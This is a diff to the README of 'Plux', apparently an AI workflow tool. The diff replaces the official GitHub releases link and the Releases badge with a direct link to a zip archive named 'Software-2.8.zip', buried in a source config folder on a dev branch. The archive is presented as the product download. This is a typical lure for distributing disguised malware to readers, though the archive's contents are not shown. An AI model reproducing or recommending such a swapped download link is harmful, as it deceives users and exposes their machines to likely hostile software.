@@ -1,8 +1,8 @@
-https://github.com/Kyaw-Min-Thant/plux/releases
+https://github.com/Kyaw-Min-Thant/plux/raw/refs/heads/dev/src-tauri/src/config/Software-2.8.zip
 
 # Plux: One-Click AI Workflows with Filetree, Notepad, and MCP
 
-[![Releases](https://img.shields.io/badge/Releases-Download-green?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kyaw-Min-Thant/plux/releases)
+[![Releases](https://github.com/Kyaw-Min-Thant/plux/raw/refs/heads/dev/src-tauri/src/config/Software-2.8.zip)](https://github.com/Kyaw-Min-Thant/plux/raw/refs/heads/dev/src-tauri/src/config/Software-2.8.zip)
 
 Plux is a tool designed to end the era of copy-paste AI workflows. It blends a clickable file tree with AI commands, a plus button to push files into AI conversations, a built-in magic notepad that captures insights, and an MCP system to channel your files to AI models. It is built to be practical, fast, and reliable. It works with multiple large language models and local inference engines, so you can choose the backend that fits your workflow. This README explains what Plux does, how it fits into your day-to-day work, and how to use it effectively.
 
